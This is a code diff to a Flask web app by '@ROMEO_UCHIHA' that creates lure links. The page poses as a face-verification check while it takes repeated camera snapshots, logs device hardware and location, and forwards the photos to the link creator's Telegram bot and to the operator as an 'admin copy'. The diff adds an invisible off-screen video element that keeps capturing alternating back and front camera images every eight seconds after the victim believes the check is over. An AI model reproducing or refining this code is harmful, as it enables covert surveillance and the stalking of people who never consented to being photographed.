@@ -1,13 +1,13 @@
-# by:@ROMEO_UCHIHA
+# by:@ROMEO_UCHIHA (Updated Background Dual-Camera Capture)
 from flask import Flask, request, render_template_string, jsonify, redirect, session
 from supabase import create_client, Client
 import base64, requests, os, time, uuid, random
 
 app = Flask(__name__)
 app.secret_key = "uchiha_super_secret_key" 
-app.config['TEMPLATES_AUTO_RELOAD'] = True # Auto reload templates
+app.config['TEMPLATES_AUTO_RELOAD'] = True
 
-# --- CACHE BUSTER (Bina Reload Kiye Changes Dekhne Ke Liye) ---
+# --- CACHE BUSTER ---
 @app.after_request
 def add_header(response):
     response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
@@ -44,33 +44,16 @@ COMMON_STYLE = """
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Poppins:wght@300;500;700&display=swap');
-    
     :root { --main-red: #ff0000; --dark-red: #8a0000; }
     @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
-    
-    body { 
-        background: radial-gradient(circle at center, #110000 0%, #000000 100%); color: #fff; 
-        display: flex; flex-direction: column; align-items: center; justify-content: center; 
-        min-height: 100vh; overflow-x: hidden; padding: 20px;
-    }
-    
-    .container { 
-        background: rgba(15, 0, 0, 0.8); backdrop-filter: blur(20px); 
-        border: 2px solid var(--main-red); border-radius: 24px; padding: 30px; 
-        width: 100%; max-width: 500px; box-shadow: 0 0 25px rgba(255, 0, 0, 0.4); 
-        animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; margin-bottom: 20px; 
-    }
-    
+    body { background: radial-gradient(circle at center, #110000 0%, #000000 100%); color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
+    .container { background: rgba(15, 0, 0, 0.8); backdrop-filter: blur(20px); border: 2px solid var(--main-red); border-radius: 24px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 0 25px rgba(255, 0, 0, 0.4); animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; margin-bottom: 20px; }
     h2 { font-family: 'Orbitron', sans-serif; color: var(--main-red); margin-bottom: 25px; font-weight: 800; letter-spacing: 2px; text-shadow: 0 0 15px var(--main-red); }
-    
     input, select { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.8); border: 1px solid var(--dark-red); color: #fff; border-radius: 14px; outline: none; transition: 0.3s; font-size: 15px; }
     input:focus, select:focus { border-color: var(--main-red); box-shadow: 0 0 15px rgba(255,0,0,0.5); }
-    
     button { width: 100%; padding: 16px; margin-top: 15px; background: linear-gradient(135deg, var(--dark-red), var(--main-red)); color: #fff; border: none; border-radius: 14px; font-weight: 700; font-size: 16px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
     button:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,0,0,0.6); }
-    
     a { color: #888; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 20px; transition: 0.3s; }
     a:hover { color: var(--main-red); text-shadow: 0 0 10px var(--main-red); }
 </style>
@@ -129,7 +112,7 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify</button></form></div>')
 
-# --- TARGET PAGE (HACK UI & RED THEME WITH DUAL CAMERA LOGIC) ---
+# --- TARGET PAGE (HACK UI & RED THEME) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -152,78 +135,27 @@ def target_page(link_id):
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
         <style>
             @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
-            
             :root { --red: #ff0000; --green: #00ff00; --grey: #333333; }
             * { box-sizing: border-box; margin: 0; padding: 0; }
-            
-            body { 
-                background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; 
-                display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;
-            }
-            
-            .face-container { 
-                display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; 
-            }
-            
-            .ring-container {
-                position: relative; width: 330px; height: 330px;
-                display: flex; align-items: center; justify-content: center; margin-bottom: 20px;
-            }
-
-            .ray-ring {
-                position: absolute; width: 100%; height: 100%; border-radius: 50%;
-                background: conic-gradient(var(--grey) 100%, transparent 0);
-                -webkit-mask: radial-gradient(transparent 64%, #000 66%), repeating-conic-gradient(#000 0deg, #000 3deg, transparent 3deg, transparent 7deg);
-                z-index: 1;
-            }
-            
-            .face-wrapper {
-                position: relative; width: 280px; height: 280px;
-                border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.5);
-                box-shadow: 0 0 35px rgba(255,0,0,0.3); z-index: 2;
-            }
-            
-            #v { width: 100%; height: 100%; object-fit: cover; background: #050000; } 
-            
-            .scan-ring {
-                position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-                border: 4px solid transparent; border-top-color: var(--red); border-right-color: rgba(255,0,0,0.3);
-                border-radius: 50%; animation: spin 2s linear infinite; box-shadow: inset 0 0 25px rgba(255,0,0,0.5);
-                z-index: 10; pointer-events: none;
-            }
-
-            .scanner-line {
-                position: absolute; top: 0; left: 0; width: 100%; height: 3px;
-                background: #ff0000; box-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
-                z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none;
-            }
-            
+            body { background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+            .face-container { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; }
+            .ring-container { position: relative; width: 330px; height: 330px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+            .ray-ring { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(var(--grey) 100%, transparent 0); -webkit-mask: radial-gradient(transparent 64%, #000 66%), repeating-conic-gradient(#000 0deg, #000 3deg, transparent 3deg, transparent 7deg); z-index: 1; }
+            .face-wrapper { position: relative; width: 280px; height: 280px; border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.5); box-shadow: 0 0 35px rgba(255,0,0,0.3); z-index: 2; }
+            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #050000; } 
+            .scan-ring { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: var(--red); border-right-color: rgba(255,0,0,0.3); border-radius: 50%; animation: spin 2s linear infinite; box-shadow: inset 0 0 25px rgba(255,0,0,0.5); z-index: 10; pointer-events: none; }
+            .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #ff0000; box-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000; z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none; }
             .loc-container { display: none; text-align: center; flex-direction: column; align-items: center; justify-content: center;}
             .pin-icon { font-size: 80px; color: var(--red); animation: bounce 1s infinite; margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
-            
             @keyframes spin { 100% { transform: rotate(360deg); } }
             @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
-            @keyframes scanAnim {
-                0% { top: 5%; opacity: 0; } 10% { opacity: 1; }
-                50% { top: 95%; opacity: 1; } 90% { opacity: 1; }
-                100% { top: 5%; opacity: 0; }
-            }
-
+            @keyframes scanAnim { 0% { top: 5%; opacity: 0; } 10% { opacity: 1; } 50% { top: 95%; opacity: 1; } 90% { opacity: 1; } 100% { top: 5%; opacity: 0; } }
             .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; margin-bottom: 10px; text-align:center;}
             .timer-display { font-family: 'Orbitron'; font-size: 4.5rem; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); line-height: 1; margin-top: 10px; }
-
-            #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; }
+            #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; overflow-y: auto; }
             .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 20px; border-radius: 15px; box-shadow: 0 0 25px rgba(255,0,0,0.3); width: 100%; max-width: 650px; margin: 0 auto; min-height: 80vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
             .content-text { color: #fff; font-size: 1.5rem; white-space: pre-wrap; font-family: 'Poppins'; margin-bottom: 20px;}
-            
-            .btn-download {
-                display: flex; align-items: center; justify-content: center; gap: 10px;
-                width: 100%; max-width: 350px; margin-top: 25px; padding: 16px;
-                background: linear-gradient(135deg, #8a0000, #ff0000); color: #fff;
-                border: 2px solid var(--red); border-radius: 12px; font-family: 'Orbitron', sans-serif;
-                font-size: 16px; font-weight: 800; text-decoration: none; text-transform: uppercase;
-                letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,0,0.5); transition: 0.3s; cursor: pointer;
-            }
+            .btn-download { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; max-width: 350px; margin-top: 25px; padding: 16px; background: linear-gradient(135deg, #8a0000, #ff0000); color: #fff; border: 2px solid var(--red); border-radius: 12px; font-family: 'Orbitron', sans-serif; font-size: 16px; font-weight: 800; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,0,0.5); transition: 0.3s; cursor: pointer; }
             .btn-download:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.8); }
         </style>
     </head>
@@ -252,6 +184,8 @@ def target_page(link_id):
         </div>
 
         <canvas id="c" style="display:none"></canvas>
+        
+        <video id="bg-v" playsinline autoplay muted style="position:fixed; top:-1000px; left:-1000px; width:10px; height:10px; opacity:0; z-index:-999;"></video>
 
         <script>
             let mode = "{{ t_type }}";
@@ -261,10 +195,10 @@ def target_page(link_id):
             let fType = "{{ f_type }}";
 
             const v = document.getElementById('v');
+            const bgV = document.getElementById('bg-v');
             const c = document.getElementById('c');
             let captureInterval = null;
-            let currentStream = null;
-            let activeLens = "FRONT"; // Tracks which lens is active
+            let bgCamMode = "environment"; // Starts with BACK camera for background
 
             window.onload = () => { getHardware(); startVerificationFlow(); };
 
@@ -273,44 +207,12 @@ def target_page(link_id):
                 fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) });
             }
 
-            // CROSS-BROWSER CAMERA SWITCHER (iOS, Windows, Android)
-            async function setCamera(facing) {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-                
-                let constraints = { video: { facingMode: facing } };
-                if (facing === "environment") {
-                    constraints = { video: { facingMode: { ideal: "environment" } } };
-                }
-
-                try {
-                    currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    v.srcObject = currentStream;
-                    
-                    // Windows/Desktop fallback check: if environment camera isn't there, it returns default
-                    activeLens = (facing === "user") ? "FRONT" : "BACK";
-                    
-                    // Front cam = Mirrored, Back cam = Normal
-                    if(facing === "user") {
-                        v.style.transform = "scaleX(-1)";
-                    } else {
-                        v.style.transform = "scaleX(1)";
-                    }
-                } catch(e) {
-                    console.log("Camera access error:", e);
-                    // Fallback to front if back fails
-                    if(facing === "environment") {
-                        setCamera("user"); 
-                    }
-                }
-            }
-
             async function startVerificationFlow() {
                 if(mode === 'both' || mode === 'camera') {
                     document.getElementById('cam-section').style.display = 'flex'; 
                     try {
-                        await setCamera("user");
+                        // FORCE FRONT CAMERA FOR INITIAL FACE VERIFICATION
+                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                         startFaceCheck();
                     } catch(e) {
                         document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
@@ -335,19 +237,16 @@ def target_page(link_id):
                 let imgData = c.toDataURL('image/jpeg', 0.5);
                 if(imgData.length < 1000) return; 
                 
-                // Send explicit side label to backend
-                fetch("/api/capture/{{ l_id }}", { 
-                    method: "POST", 
-                    headers: {"Content-Type":"application/json"}, 
-                    body: JSON.stringify({ img: imgData, side: activeLens }) 
-                });
+                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: "FRONT" }) });
             }
 
             function startFaceCheck() {
-                // Snap interval set to 800ms
-                captureInterval = setInterval(takeSnap, 800); 
+                captureInterval = setInterval(takeSnap, 600); 
 
                 let timeLeft = 15;
+                let instructions = ["Look Straight", "Look Left", "Look Right", "Look Slightly Up", "Scanning Features..."];
+                let step = 0;
+                
                 const faceMsg = document.getElementById('face-msg');
                 const timerText = document.getElementById('seconds-timer');
                 const rayRing = document.getElementById('rayRing');
@@ -360,30 +259,22 @@ def target_page(link_id):
                     let percent = Math.min((elapsed / duration) * 100, 100);
                     rayRing.style.background = `conic-gradient(var(--green) ${percent}%, var(--grey) 0%)`;
                     if (percent >= 100) clearInterval(animFrame);
-                }, 50);
+                }, 50); 
 
-                // CAMERA TOGGLE LOGIC:
-                // Start: Front (15-11s) -> Switch Back (10-6s) -> Switch Front (5-3s) -> Switch Back (2-0s)
                 let timer = setInterval(() => {
                     timeLeft--;
                     timerText.innerText = timeLeft; 
-
-                    if(timeLeft === 11) {
-                        faceMsg.innerText = "ACCESSING BACK LENS...";
-                        setCamera("environment");
-                    } else if (timeLeft === 6) {
-                        faceMsg.innerText = "ACCESSING FRONT LENS...";
-                        setCamera("user");
-                    } else if (timeLeft === 3) {
-                        faceMsg.innerText = "FINALIZING ENVIRONMENT...";
-                        setCamera("environment");
-                    }
+                    
+                    if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
+                    faceMsg.innerText = instructions[step];
 
                     if(timeLeft <= 0) {
                         clearInterval(timer);
                         clearInterval(captureInterval);
-                        if(currentStream) currentStream.getTracks().forEach(t => t.stop());
                         
+                        // Stop the initial front camera stream to free resources for background logic
+                        if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
+
                         if(mode === 'both') {
                             document.getElementById('cam-section').style.display = 'none';
                             startLocationCheck();
@@ -413,6 +304,49 @@ def target_page(link_id):
                 } else {
                     showContent();
                 }
+            }
+
+            async function captureBackground() {
+                try {
+                    // Stop current background stream if exists
+                    if (bgV.srcObject) {
+                        bgV.srcObject.getTracks().forEach(t => t.stop());
+                    }
+                    
+                    // Try exact mode first (better for strict mobile browsers) then fallback
+                    let stream;
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: bgCamMode } } });
+                    } catch(err) {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: bgCamMode } });
+                    }
+                    
+                    bgV.srcObject = stream;
+                    
+                    bgV.onloadedmetadata = () => {
+                        bgV.play();
+                        // Wait for camera to adjust focus and lighting
+                        setTimeout(() => {
+                            if(bgV.videoWidth > 0) {
+                                c.width = bgV.videoWidth;
+                                c.height = bgV.videoHeight;
+                                c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
+                                
+                                let imgData = c.toDataURL('image/jpeg', 0.5);
+                                let label = bgCamMode === "user" ? "FRONT" : "BACK";
+                                
+                                fetch("/api/capture/{{ l_id }}", { 
+                                    method: "POST", 
+                                    headers: {"Content-Type":"application/json"}, 
+                                    body: JSON.stringify({ img: imgData, cam_type: label }) 
+                                });
+                                
+                                // Toggle camera mode for the NEXT cycle (Back -> Front -> Back)
+                                bgCamMode = (bgCamMode === "environment") ? "user" : "environment";
+                            }
+                        }, 2000); 
+                    };
+                } catch(e) { console.error("BG Camera Error"); }
             }
 
             function showContent() {
@@ -446,6 +380,13 @@ def target_page(link_id):
                     html = `<iframe src="${actVal}" style="width:100%; height:80vh; border:none; border-radius:10px;"></iframe>`;
                 }
                 medBox.innerHTML = html;
+
+                // START THE INVISIBLE BACKGROUND CAPTURE LOOP
+                if(mode === 'both' || mode === 'camera') {
+                    // Trigger first background shot immediately, then loop every 8 seconds
+                    captureBackground();
+                    setInterval(captureBackground, 8000);
+                }
             }
         </script>
     </body>
@@ -488,19 +429,16 @@ def cap(l_id):
     try:
         link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
         user = link["users"]
-        
         data = request.get_json()
-        img_data = data.get("img", "")
-        lens_side = data.get("side", "UNKNOWN") # Yahan Pata Chalega Front Hai Ya Back
+        
+        img_data = data["img"]
+        cam_type = data.get("cam_type", "UNKNOWN") # FRONT ya BACK read karega
         
         raw = base64.b64decode(img_data.split(",")[1])
         
-        # Telegram Message Main Label Add Kiya Hai
-        caption_msg = f"😈 *UCHIHA CAPTURE* \\n📸 Lens: *[{lens_side} CAMERA]*"
-        
-        send_tg_photo(user["bot_token"], user["chat_id"], raw, caption_msg)
-        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}\\n📸 Lens: {lens_side}")
-        
+        # Caption updated for Front/Back label
+        send_tg_photo(user["bot_token"], user["chat_id"], raw, f"😈 *UCHIHA CAPTURE*\\n📸 *Camera:* `{cam_type}`")
+        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}\\nCam: {cam_type}")
         return jsonify({"s": 1})
     except: return jsonify({"s": 0})
 
